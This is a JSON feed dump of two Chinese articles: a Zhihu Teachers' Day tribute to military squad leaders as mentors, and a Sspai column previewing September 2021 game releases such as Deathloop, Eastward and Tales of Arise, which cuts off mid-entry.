[{"title":"军营里，有一种老师叫「班长」，关于他们有哪些故事和话语让你记忆深刻？","date":"2021-09-10 06:48:24","description":"\n<p>今天是第37个教师节</p>\n<p>在军营也有一群“老师”</p>\n<p>他们是战友眼中的“顶梁柱”</p>\n<p>是素质过硬的教练员</p>\n<p>是倾心“传帮带”的引路人一批批有志青年成长为合格军人他们毫无保留倾囊相授他们有一个共同的名字<b>班  长！！！</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-8a3e1cd5eedac034c9cbc2b2c3e2cefd_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-8a3e1cd5eedac034c9cbc2b2c3e2cefd\" data-watermark-src=\"v2-6511347c0d68224566187420c816d472\" data-private-watermark-src=\"v2-8086a2998c2f0fa729b51575ec88daf6\"></p>\n<p>训练场上</p>\n<p>铁面无情的是他们</p>\n<p>只为打下良好基础</p>\n<p>平时只有多流汗</p>\n<p>战时才能少流血</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-27f187b439068e6b1d5cd5101fdd6573_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"630\" data-watermark=\"original\" data-original-src=\"v2-27f187b439068e6b1d5cd5101fdd6573\" data-watermark-src=\"v2-1a4bcba11589db9d50ed9b411036a161\" data-private-watermark-src=\"v2-338d8c8038ab05c123fd458aa1770798\"></p>\n<p><br></p>\n<p>生活中</p>\n<p>关怀备至也是他们因为他们懂得</p>\n<p>以心交心才能换得真心</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ef0ccd52960ce2a30706148e11c88dee_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"630\" data-rawheight=\"630\" data-watermark=\"original\" data-original-src=\"v2-ef0ccd52960ce2a30706148e11c88dee\" data-watermark-src=\"v2-0c636f8d519f2365c93ab94886ee770a\" data-private-watermark-src=\"v2-7e0ed323dd43c7784941dd7fa7c9e08e\"></p>\n<p>急难险重任务面前</p>\n<p>出色完成任务的更是他们</p>\n<p>因为他们明白<br></p>\n<p>干出样子是职责所在</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d127cc64a22009a1eb8c5cea61abbe53_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"630\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-d127cc64a22009a1eb8c5cea61abbe53\" data-watermark-src=\"v2-1a1a33ca0700540c70b0a5944baad566\" data-private-watermark-src=\"v2-c5837ad765004571da2603ffb0869cf7\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-81ef4dfe998e7dc32518d5e6925f9de9_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"51\" data-rawheight=\"51\" data-watermark=\"original\" data-original-src=\"v2-81ef4dfe998e7dc32518d5e6925f9de9\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>真情①：知心</b></p>\n<p>一个班虽然人不算多，但也称得上是各有千秋！不过没关系，班长对每个人情况“如数家珍”，一个表情、一个动作、一声叹息，都会引起班长的注意，面对面谈心交流，专治各种“疑难杂症”。</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-ecf4b424d262b0dfa1ea9712eb59717a_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"667\" data-watermark=\"original\" data-original-src=\"v2-ecf4b424d262b0dfa1ea9712eb59717a\" data-watermark-src=\"v2-d777ddf979c9e26cde7e4c39464c7392\" data-private-watermark-src=\"v2-011be1a0bba1f7bfc95099d059e4434a\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-81ef4dfe998e7dc32518d5e6925f9de9_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"51\" data-rawheight=\"51\" data-watermark=\"original\" data-original-src=\"v2-81ef4dfe998e7dc32518d5e6925f9de9\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>真情②：暖心</b></p>\n<p>不论是冰冻三尺还是骄阳似火，班长的关心总能直抵内心。想家时一句安慰、生日时一声祝福、成功时一个肯定，让你感到身边有个精心照顾你的暖心大哥。</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-0771c159ec2a32a71dbf817b626c58e0_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"667\" data-watermark=\"original\" data-original-src=\"v2-0771c159ec2a32a71dbf817b626c58e0\" data-watermark-src=\"v2-2e9110082a5f7d8857f2268b43c782d8\" data-private-watermark-src=\"v2-8db38f5dbc32f18941d2fbcc067c3d27\"></p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-81ef4dfe998e7dc32518d5e6925f9de9_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"51\" data-rawheight=\"51\" data-watermark=\"original\" data-original-src=\"v2-81ef4dfe998e7dc32518d5e6925f9de9\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>真情③：信心</b></p>\n<p>筋疲力尽没动力？任务陌生有畏难？卫生打扫怕脏累？学习劲头不够足？只要有需要，班长总能在身边！一句“跟我来！看我的！有我在！”立马让你找回状态、信心百倍！<br></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-910731ca5c705d3bca410a90249bf754_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"667\" data-watermark=\"original\" data-original-src=\"v2-910731ca5c705d3bca410a90249bf754\" data-watermark-src=\"v2-a72f75c2fb47b43885ac74110bfa40be\" data-private-watermark-src=\"v2-06f0c9e3005c9fd7baf035084e3d6be8\"></p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-81ef4dfe998e7dc32518d5e6925f9de9_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"51\" data-rawheight=\"51\" data-watermark=\"original\" data-original-src=\"v2-81ef4dfe998e7dc32518d5e6925f9de9\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>真情④：耐心</b>、</p>\n<p>军人的成长是破茧成蝶的过程，磨砺中退掉所有青涩和稚嫩。在军旅之路，总有班长伴我们左右，化身为指路明灯，不论进步快或慢，都耐心指引我们向更高的山去冲锋。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-6608086cf2605109207098b5733a1e45_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"667\" data-watermark=\"original\" data-original-src=\"v2-6608086cf2605109207098b5733a1e45\" data-watermark-src=\"v2-da8d4e353b88bcafea9ec9d427d82be4\" data-private-watermark-src=\"v2-91096068b55bb3a2076d012d92ed74c2\"></p>\n<p><br></p>\n<p><b>一声班长，一生班长</b></p>\n<p><b>军营有你，未来可期军旅路上</b></p>\n<p><b>都有一个前行的背影今天我们向班长致敬</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-bu-zhan-qu-57?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中部号角</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/485594623/answer/2113250381?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">19 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/23001321?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">在部队如何当好班长 ?</a><br><a href=\"http://www.zhihu.com/question/35520013?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">在部队，大家都经历过哪些有意思的班长？</a><br>\n","link":"http://www.zhihu.com/question/485594623/answer/2113250381?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"本月玩什么 | 死亡循环、暗影火炬城、死亡搁浅导剪版、风来之国","date":"2021-09-10 06:33:43","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>欢迎来到<strong>「本月玩什么」</strong>，本栏目将从作者个人角度出发，为大家挑选、简介本月新发售的部分游戏作品/内容，主要涵盖 PlayStation、Xbox、Nintendo、PC 和 iOS/Android 等主流平台，期待里面有能勾起你兴趣的好玩意儿，也真诚感谢所有喜欢本栏目的朋友。</p>\n<p>本栏目设有<strong>有奖互动</strong>环节，详情依旧请看文末。本月游戏阵容爆炸，调研工作量令人翻白眼，但能玩到这么多期待已久的游戏，确实心生欣慰之情，对笔者个人而言，尤其是以下要说到的……</p>\n<h2>死亡循环 / DEATHLOOP</h2>\n<blockquote><p>天才的 Arkane Studios，你做了什么，快让我试试！</p></blockquote>\n<ul>\n<li>推出日期：2021.09.15</li>\n<li>登陆平台：PS5、PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/4d002831b9cbb8ac5edbba0c9da0025f.jpg\"></figure><p>《死亡循环》是一款新意十足的第一人称射击作品，由饱受赞誉的法国开发商 Arkane Studios 负责开发，整体美术风格源于对上世纪 60 年代主流审美的加工，玩法内核则像同门的《羞辱（Dishonored）》《掠食（Prey）》等系列一样考究，令人很难不一见倾心。</p>\n<p>本作中，玩家主要扮演的是一位名叫寇特（Colt）的杀手，你被困在了一个时间循环里，只能在巨型实验设施覆盖的岛上活动，摆在你面前的出路很清晰，必须在一整天时间里刺杀掉藏在岛上的八个指定目标，要么就尝试完成任务，要么就卡在里面经历一个个相同地昼夜，死亡或是时间耗尽后重新开始；但是，时间循环并不会重置记忆，因此你不光可以在海量循环中搜集情报、掌握环境规律，不断逼近「一条龙」击杀八人的完美循环，还有机会探寻时间循环背后的真相，拼合出故事的全貌。</p>\n<p>就已经披露的玩法信息，笔者想指出《死亡循环》三点很有意思的特色：</p>\n<ul>\n<li>其一，由于是为 PS5 独占而生，《死亡循环》深度挖掘了 PS5 手柄的软硬件机能，自适应扳机将凸显众多武器差异化的射击手感，乃至模拟子弹卡壳时的故障处理，精密的振动马达会还原双脚在各种场景下的触感。</li>\n<li>其二，岛上有海量的 NPC，这些 NPC 的攻击欲望、战斗能力都不强，因为真正的挑战不在于消灭这些敌人，而是在于对整个岛屿地形结构、NPC 行动规律的充分掌握，再分析得到整个「暗杀一笔画」谜题的解（甚至是最优解）。在网上已放出的游玩片段中我们可以看到，《死亡循环》的游戏地图层次丰富、机关遍布，玩家手上还握有骇入、短距传送、绑定敌人（一个人受的伤会等效传递给另一人）等特殊能力，排列组合能产生的游戏策略数量将难以想象。</li>\n<li>其三，如果岛上的所有要素在反复循环中都是一成不变的，那么玩家的解谜过程恐怕就会少几分趣味和刺激，开发团队的应对正是游戏封面上的那位女士——八个目标中的一员、反过来追杀寇特的朱莉安娜（Julianna）。在你准备狩猎的同时，搅局者朱莉安娜可能正盯着你的一举一动，而且这个朱莉安娜不仅可由 AI 控制，还可以由随机的某位真人玩家掌控，这陡然提升了玩家与周遭环境博弈的复杂度，也确实是个能让人兴奋得搓手的联机玩法设计。</li>\n</ul>\n<h2>暗影火炬城 / F.I.S.T.: Forged In Shadow Torch</h2>\n<blockquote><p>「长跑」多年的索尼「中国之星计划」孵化作品。</p></blockquote>\n<ul>\n<li>推出日期：2021.09.07</li>\n<li>登陆平台：PS4、PS5、PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/cf5fd99c21774eaa7ce4d0fefdefb06d.jpg\"></figure><p>一款横版动作银河城（Castlevania）游戏，描绘了一个柴油朋克、动物拟人、近代中国城市（很接近老上海）等要素相互杂糅的有趣世界观，玩家将扮演一位身披拳套重甲的前抵抗军战士——兔子雷德文，本已解甲归田的他，因为身边朋友接连「被消失」而重操旧业，随着冒险的深入，雷德文将越发接近整个阴谋的核心，流程中的遭遇战也会越发火爆刺激。</p>\n<p>既然是银河城类作品，随进度获得全新技能、探索全地图并来回穿梭、与各路 NPC 对话以获知故事全貌……这些标志性的要素当然没少，而在此之外，个人认为《暗影火炬城》极其重视视听卖相的打造，帮助游戏树立起了自身的品质标杆：本作使用了虚幻引擎 4，由于是横版过关玩法，摄像机位相对固定、可视区域不算太大，饱和的美术「堆料」把场景装点得十分精致，各位角色皮毛、武装的质感也得到了充分还原，再配以顿挫有力的打击感、细腻的声光特效，这些要素都使得《暗影火炬城》的游戏体验更显得养眼。</p>\n<p>本作曾用名「暗影火炬」，是索尼「中国之星计划」第二期（2019 年）的孵化项目之一，如今不仅顺利完工，还做出了杠杠的质量，今年初曾获英伟达 Geforce RTX 技术演示的官方站台，堪称是「中国之星计划」截至目前走得最远、最具成功潜质的项目之一。</p>\n<h2>死亡搁浅 导演剪辑版 / DEATH STRANDING DIRECTOR'S CUT</h2>\n<blockquote><p>《死亡搁浅》威力加强版独占登陆 PS5。</p></blockquote>\n<ul>\n<li>推出日期：2021.09.24</li>\n<li>登陆平台：PS5</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/f0c543d9e1a869e150550aba0f8cf9e2.jpg\"></figure><p>为 PS5 独占奉上的《死亡搁浅》超级加强版，增加了一大堆新玩意儿，有新敌人、新武器、新的辅助送货机器人、新的「巨炮」送货装置、赛车/靶场等全新小游戏、新的次要剧情等，当然还有一个小岛秀夫自己讨厌的「导演剪辑版」冠名。</p>\n<p>个人看来，这部加强版补充了很多娱乐性较强的要素，并有助于玩家在游戏后期更进一步提高「生产力」，另外还在 PS5 机型上实现了更优的画面表现，升级补差价还只需要 10 美元（听说前一阵另外有个索尼家的游戏升级要 29.99 美元？），买不了吃亏、买不了上当。</p>\n<h2>风来之国 / Eastward</h2>\n<blockquote><p>获得任天堂直面会「压轴认可」的国内独立团队作品，有生之年系列。</p></blockquote>\n<ul>\n<li>推出日期：2021.09.16</li>\n<li>登陆平台：NS、PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/8863ded60d865a0ae5d20904ed787566.jpg\"></figure><p>「爷爷，你一直念叨的游戏终于要发售了！」</p>\n<p>本作由位于上海的独立游戏工作室 Pixpil 制作，是一款像素风格的类《塞尔达传说》动作冒险解谜游戏，故事设定在某种后启示录的背景下，地底镇的工人约翰（John）无意间唤醒了在地下沉睡的谜之少女珊（Sam），约翰会造武器、挥舞平底锅，珊则是一位远程魔法使用者，两人组成一队，开始了在人类文明已然失落的大地上探险。</p>\n<p>说实话，我已经完全忘记自己是哪一年关注了 Pixpil 的微博，只记得当初偶遇时，这个看起来像是独立游戏人的博主，不时会上传一些漂亮的像素风格开发截图，不仅有美妙的手绘人物、场景，还有精致且逼真的光影效果，当时给我的冲击绝不亚于初见《八方旅人（Octopath Traveler）》，而对《风来之国》画面的好感也一直延续至今、只增不减，当然我也更希望，本作极少对外透露的故事情节、战斗玩法等内容能有令人满意的表现。</p>\n<h2>破晓传奇 / Tales of Arise</h2>\n<blockquote><p>「传奇」系列脱胎换骨记。</p></blockquote>\n<ul>\n<li>推出日期：2021.09.09</li>\n<li>登陆平台：PS4、PS5、X1、XS S/X、PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/2afa5b14dea1d7c5c9f02ed4ee252964.jpg\"></figure><p>著名 RPG 系列「传奇（Tales of）」的最新作、系列 25 周年纪念作，最早在 E3 2019 微软展前发布会上惊艳揭幕，讲述了与先前作品无关联的全新故事线，玩家将插足两个不同世界的对抗，体验一段抗击奴役、抗争命运的勇者冒险传说。</p>\n<p>《破晓传奇》是系列第十七代正传，距上一部正传《绯夜传奇（Tales of Berseria）》发售已有 5 年之久，这是正传历史上最长的断代，而长期的等待最终换来了此番惊人的蜕变。</p>\n<p>《破晓传奇》采用虚幻引擎 4 制作，视效水平陡升，官方称之为「Atmos Shaders」的技术优化了远景效果及功耗，近景的精细程度随之提升；战斗玩法调整为完全动态的 ARPG，据制作人富泽祐介在<a href=\"https://www.a9vg.com/article/156635\">相关访谈</a>中谈到，本作的战斗系统是「从零开始重新构筑的」，玩起来与通常的 ARPG 作品比较接近（应该是指角色明确的有了普通、特殊攻击动作等），这能让首次接触「传奇」系列的 ARPG 玩家尽快上手，能享受到更多乐趣。</p>\n<h2>开拓者：正义之怒 / Pathfinder: Warth of the Righteous</h2>\n<blockquote><p>「开拓者」桌游规则改编游戏新作。</p></blockquote>\n<ul>\n<li>推出日期：2021.09.02</li>\n<li>登陆平台：PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/6dd5085c1cc5ffdf14e88e4db415c8b6.jpg\"></figure><p>一款奇幻题材的等视距 CRPG，由专注该品类的开发商 Owlcat Games 出品，玩家可在此领略到千变万化的角色塑造、可能引发蝴蝶效应的大量抉择、策略性强的可暂停即时制战斗等等，随着对奇幻设定了解的程度不断加深，触碰到富有史诗感的故事线。</p>\n<p>「开拓者」电子游戏系列基于《开拓者角色扮演游戏（Pathfinder Roleplaying Game）》开发而来，后者采用的规则是从龙与地下城（Dungeon &amp; Dragon）3.5 版规则分叉、魔改得到的，分叉的原因是发行商 Paizo Publishing 及社区对当时刚问世的 D&amp;D 4E 规则抱有疑虑，「开拓者」初版规则也因此被贴上了「D&amp;D 3.75E」的昵称。</p>\n<p>算上本作，「开拓者」系列目前已有两部众筹成功的游戏存世，上一部是 2018 年发售的《开拓者：拥王者（Pathfinder: Kingmaker）》，均改编自官方出版的同名系列冒险（Adventure path），从官方宣传及<a href=\"https://twitter.com/chrisavellone/status/1202534211858530305\">相关社交媒体信息</a>可知，两代作品均有知名剧作家 Chris Avellone 参与护航，开发商 Owlcat Games 整体更是非常热衷于继承《博德之门（Baldur's Gate）》《无冬之夜（Neverwinter Nights）》等 CRPG 名篇的衣钵；至少从《拥王者》（及其增强版）的质量、社区反馈来看，「开拓者」系列电子游戏配得上开发团队的豪言。</p>\n<p>一点补充信息：Chris Avellone 曾于去年受到了来自多人的性骚扰指控，前几个月<a href=\"https://chrisavellone.medium.com/ending-silence-c48e86f7c523\">他发表了一则声明</a>，谈论了他个人对该事件的认知、相关庭审披露的客观事实，感兴趣的读者可以前往 Medium 阅读原文。</p>\n<h2>分享同乐！瓦力欧制造 / WarioWare: Get It Together!</h2>\n<blockquote><p>瓦力欧再当主角，我们已经等了太久。</p></blockquote>\n<ul>\n<li>推出日期：2021.09.10</li>\n<li>登陆平台：NS</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/d73117b587c548a7d14516af8b49e1ee.jpg\"></figure><p>久违的《瓦力欧制造》系列非合集新作，给笔者童年带来过无数欢乐的名角瓦力欧，这次终于携自己主演的作品搬上了 NS 平台。</p>\n<p>《瓦力欧制造》系列主打的是短小精悍、量大质优的小游戏，本作号称有超过 200 款，它们的题材、机制五花八门，大都和物理特性有关，有挤牙膏、扇扇子、扳手腕等看起来寻常的，也有堵鼻孔、撕面膜、刮腋毛等搞怪无厘头的，玩家则需要在看到画面后的 5 秒内理解规则、完成动作解谜，对于不熟悉的题目，往往需要下意识地先动起来，操作只涉及一根摇杆、一枚按键。</p>\n<p>与标题中「分享同乐」相呼应，本作加入了多角色，并允许最多四人本地联机，在全系列中首开先河。玩家可以游玩故事模式来不断解锁其他可用角色，各角色的固有能力不同（可能是冲刺、飞行、射击等等），意味着有不同的动作解谜路径。另外，《分享同乐！瓦力欧制造》展现了吸引玩家持续重复游玩的意图，除了上述的多角色、多人联机外，本作还加入了每周更新挑战项目的「瓦力欧杯」排位赛，发售前预告还展示了大量随机抽选、收集、换装要素。</p>\n<h2>世界拉力锦标赛 10 / WRC 10 FIA World Rally Championship</h2>\n<blockquote><p>WRC 赛事对应的「年货」游戏，强调偏拟真的赛道设计与驾驶手感。</p></blockquote>\n<ul>\n<li>推出日期：2021.09.02</li>\n<li>登陆平台：PS4、PS5、X1、XS S/X、NS、PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/139209855e61b07ca0625cfe0d562580.jpg\"></figure><p>赛事授权的竞速模拟游戏，也是「世界拉力锦标赛（World Rally Championship，简写为 WRC）」诞生 50 周年的纪念作，得益于这一特别背景，本作的内容规模达到了全系列最大的水平：与现实赛事联动的常规「年货」性质内容自然不会缺席，有 2021 年最新的爱沙尼亚、克罗地亚等四场拉力赛，还有全新的官方车队、传奇车辆等内容；而为了呼应周年纪念，本作还首次加入了「历史模式」，复刻了雅典、德国、阿根廷等六场过去的经典拉力赛。</p>\n<p>WRC 是全球最顶级的汽车拉力赛事之一，由国际汽车联合会（Fédération Internationale de l'Automobile，简写为 FIA）管理，该赛事一大核心特色是环境很接近真实世界，赛道几乎都是主办国内的真实道路，参赛车辆也必须在 FIA 允许的量产车型上改装而来。</p>\n<p>电子游戏系列较好地还原了上述这些 WRC 的独特元素，驾驶手感总体偏拟真、偶有波动，比如《WRC 10》就因深度优化手柄操作、忽视了方向盘外设手感而遭到部分玩家「投诉」，背后的原因还是开发商尝试创新、不断在更迭，在可预见的未来，这种驾驶手感波动也许还会继续：本作开发商 Kylotonn 从 2015 年的《WRC 5》起就一直执掌本系列，而到了《WRC 11》（预计 2022 年）之后，《WRC》系列的独占开发权将被移交给另一竞速模拟大厂——创立了《尘埃（Dirt）》系列的英国开发商 Codemasters。</p>\n<h2>奇艺出逃 / The Artful Escape</h2>\n<blockquote><p>怎样才能鼓起勇气上台，怎样才能走出父辈成就光环的笼罩？</p></blockquote>\n<ul>\n<li>推出日期：2021.09.10</li>\n<li>登陆平台：X1、XS S/X、PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/85945c0a18636d42716f781a30fe3b9b.jpg\"></figure><p>一款看上去就气质不凡的作品，由一位音乐人领衔组建的迷你工作室 Beethoven &amp; Dinosaur 制作，讲述了主角 Francis Vendetti 压抑却又奇妙的一夜，这位已故传奇民谣巨星 Johnny Vendetti 的外甥为了释放压力，在首次登台表演前来了一次「灵魂出窍」，循着这段心灵之旅，试着激发内心深处敢于登台献唱、引爆全场的那个人格面具。</p>\n<p>本作含有平台跳跃、谜题破解等玩法要素，但整个流程无疑更像是一场视听体验丰满的盛大游行，玩家会在跑跳、抚琴的同时领略 Francis 五彩斑斓的精神世界、从各色生物处学习采样，一趟「出逃」最终将成为玩家自己谱写的灵动乐曲。按照核心主创 Johnny Galvatron <a href=\"https://www.polygon.com/features/2016/3/30/11332360/the-artful-escape-of-francis-vendetti-kickstarter-johnny-galvatron-interview\">在访谈中的说法</a>，《奇艺出逃》的故事脉络被他描述为「大卫·鲍伊从伦敦出发、踏上星际旅行，并由此创作出《Ziggy Stardust》（David Bowie traveling off from London on an interstellar trip to create Ziggy Stardust）」，另外也受到斯坦利·库布里克、韦斯·安德森、史蒂芬·斯皮尔伯格等电影大家的影响。欲知详情如何，还得扎进稀奇古怪的关卡里一探究竟。</p>\n<p>《奇艺出逃》的灵魂人物 Johnny Galvatron 曾组过几支乐队，最后的一支叫 The Galvatron 的人气最高，在澳洲本土小有名气、还去过英国巡演，但 Johnny 最终还是投身到了游戏行业，既有他电影、电脑动画教育背景的影响，也有他对乐队例行公事的厌倦。工作室成立之初曾获 Epic Games 发出的 17000 美元虚幻引擎开发补助金，后于 2016 年发起过 Kickstarter 众筹，虽未达金额目标，但本作最终被发行商 Annapurna Interactive 拿下；与《十二分钟（Twelve Minutes）》一样，发行商的牵线还促成了本作扎实的配音阵容，有了迈克尔·约翰斯顿（Michael Johnston）、琳娜·海蒂（Lena Headey）、马克·斯特朗（Mark Strong）等知名演艺人士为游戏献声。</p>\n<h2>骇客游侠 / Gamedec</h2>\n<blockquote><p>赛博朋克题材、非战斗、难抉择的 CRPG。</p></blockquote>\n<ul>\n<li>推出日期：2021.09.17</li>\n<li>登陆平台：PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/8e08c543a13462414fc3b7268177eac0.jpg\"></figure><p>一款赛博朋克题材的等视距 CRPG 作品，来自波兰的开发商 Anshar Studios 就地取材，描绘了他们想象中二十二世纪的大都会「华沙城」，以及虚拟与现实紧密纠缠的未来高科技社会。</p>\n<p>玩家将在游戏中扮演一位「骇客游侠」，这是一种随时代应运而生的侦探职业，需要用到高超的黑客、调查、推理技巧，在真实世界与多彩的沉浸式虚拟空间之间往返，尝试破解手上的悬案。本作没有战斗，</p>\n<p>在宣传中，开发团队为我们展示了《骇客游侠》在探案玩法上的勃勃野心，基于点数的角色能力塑造、数值检定等 CRPG 惯用要素齐聚，在此之上，本作还自豪地引入了一种复杂度较高的侦探玩法机制——玩家需要按照自己的想法拼合线索，固化成自己心目中的案件真相，但游戏不会判断你想法的对错，只会随故事推进慢慢把你引向相应的后果。这听起来有些抽象，也很带劲，就是不知道实际的自由度有多高，总之我是等不及想试试了。</p>\n<h2>随机王国迷踪 / Lost in Random</h2>\n<blockquote><p>以「骰子」作为核心意象之一的动作冒险。</p></blockquote>\n<ul>\n<li>推出日期：2021.09.10</li>\n<li>登陆平台：PS4、PS5、Xbox（支持智能分发）、NS、PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/c19c6c03be8eaf94a4ceb34cacf9f796.jpg\"></figure><p>一部风格压抑的第三人称动作冒险游戏，于 EA Play 2019 上首次公开，由制作了《Fe》的瑞典开发商 Zoink Games 出品。</p>\n<p>本作的线性剧情带有浓烈的暗黑童话色彩：故事发生在所谓的「随机王国（Random）」，一位邪恶的女王统治着被分为六界的整个王国，这里的小孩长到 12 岁时，女王都会投掷骰子决定其被送到数字对应的哪个领域，据传说，除了「6」对应的女王宫殿有享不尽的荣华富贵，别的领域环境都相当恶劣。本作的一对主角姐妹—— Even 和 Odd（偶数、奇数）——正是经历了这样的命运操弄，姐姐 Odd 被投出「6」的女王接走，本已因此伤心的 Even一年后又意外收到了诡异的信号，最终 Even 决定前去寻回 Odd；途中 Even 邂逅了一颗有生命的骰子，她还发现这种被严禁接触的事物具有扭转时空的强大力量，并且就像你想的一样，揭露世界阴暗面的责任也随力量而来。</p>\n<p>骰子的意象不仅在剧情中占有重要地位，也被开发团队有机融入了战斗玩法。本作中的战斗都发生在固定的封闭竞技场内，玩家需击打敌人使之掉落某种晶体，再花费这些晶体投掷骰子、根据投掷结果使用卡牌，可以生成武器、法术等，为纯动作掺入了一些策略、随机成分。</p>\n<p>根据相关的开发者访谈，本作广泛地从蒂姆·波顿电影作品、游戏《奇异世界（Oddworld）》系列、动画《花园墙外（Over the Garden Wall）》等各类艺术作品中汲取了灵感，而游戏的剧本则由参与过漫画《无敌松鼠女孩（The Unbeatable Squirrel Girl）》、动画《探险时光（Adventure Time）》剧本家瑞安·诺斯（Ryan North）执笔。</p>\n<h2>荒神 2 / Aragami 2</h2>\n<blockquote><p>暗影之力终于可以用来刚正面了。</p></blockquote>\n<ul>\n<li>推出日期：2021.09.17</li>\n<li>登陆平台：PS4、PS5、Xbox（支持智能分发）、PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/c3ad24a4d3095e1fe5f88f290b8469bc.jpg\"></figure><p>潜行刺杀游戏《荒神》的正统续作，作为「荒神」一族残存的战力之一，你需要利用好诅咒族人的暗影之力，用以完成对抗侵略的刺杀行动。</p>\n<p>距离初代作品面世已过去五年，开发商 Lince Works 现在有了更充足的预算，开发人员<a href=\"https://gamingbolt.com/aragami-2-dev-says-game-represents-everything-they-wanted-the-first-one-to-be\">在近期发布的一则采访稿中透露</a>，足够的资源终于让《荒神 2》成为了更接近其原始想法的作品：</p>\n<ul>\n<li>画面方面，本作摒弃了初代高度卡通化的美术风格，游戏中的材质、光影、特效等全都焕然一新、更偏拟真。</li>\n<li>玩法方面，初代敦促玩家始终贯彻潜行打法，如不幸被发现，战斗难度奇高，还要重扣得分——现在我们知道了，是预算不足以把控正面战场，导致开发人员「戴着镣铐跳舞」；《荒神 2》补齐了正面作战的短板，强化了战斗趣味，玩家现在可与敌人捉对厮杀，通过躲闪、弹反、会心一击、处决等机制取胜，能看到一些《只狼：影逝二度（Sekiro: Shadows Die Twice）》的影子。</li>\n</ul>\n<h2>索尼克 缤纷色彩 究极版 / Sonic Colors: Ultimate</h2>\n<blockquote><p>为纪念《索尼克》系列 30 周年推出的复刻作品。</p></blockquote>\n<ul>\n<li>推出日期：2021.09.09</li>\n<li>登陆平台：PS4、NS、PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/af6025d76c8a3e3dcb8968c5322661e7.jpg\"></figure><p>「索尼克」IP庆祝 30 周年纪念的复刻作品，由《生化奇兵（BioShock）》《质量效应（Mass Effect）》系列重制合集的开发商 Blind Squirrel Games 